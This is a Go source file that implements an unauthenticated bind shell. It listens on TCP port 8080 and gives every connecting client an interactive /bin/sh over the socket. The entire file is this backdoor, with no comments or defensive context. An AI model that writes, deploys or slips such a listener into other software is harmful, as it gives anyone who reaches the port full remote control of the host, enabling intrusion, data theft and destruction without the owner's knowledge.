package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{bufio.NewWriter(w)}
}

func (f *Flusher) Write(b []byte) (int, error) {
	n, err := f.w.Write(b)

	if err != nil {
		return 0, err
	}

	if err = f.w.Flush(); err != nil {
		return 0, err
	}

	return n, err
}

func main() {
	l, err := net.Listen("tcp", ":8080")

	if err != nil {
		log.Fatal(err)
	}

	for {
		conn, err := l.Accept()

		if err != nil {
			log.Fatal(err)
		}

		go func(conn net.Conn) {
			cmd := exec.Command("/bin/sh", "-i")

			cmd.Stdin = conn
			cmd.Stdout = NewFlusher(conn)

			if err = cmd.Run(); err != nil {
				log.Fatal(err)
			}
		}(conn)
	}
}
